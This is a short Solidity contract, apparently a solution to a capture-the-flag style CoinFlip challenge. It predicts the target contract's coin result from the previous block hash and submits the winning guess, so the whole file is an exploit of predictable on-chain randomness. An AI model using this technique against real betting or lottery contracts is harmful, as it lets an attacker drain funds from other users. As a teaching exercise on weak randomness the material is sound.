// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "./coinFlip.sol"; // Original CoinFlip contract

contract RiggedCoinFlip is CoinFlip{
    using SafeMath for uint256;

    CoinFlip public coinFlipContract;

    constructor(address coinFlipContractAddress) public{
        coinFlipContract = CoinFlip(coinFlipContractAddress);
    }

    function riggedGuess() public{ 
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        coinFlipContract.flip(side);
    }
}
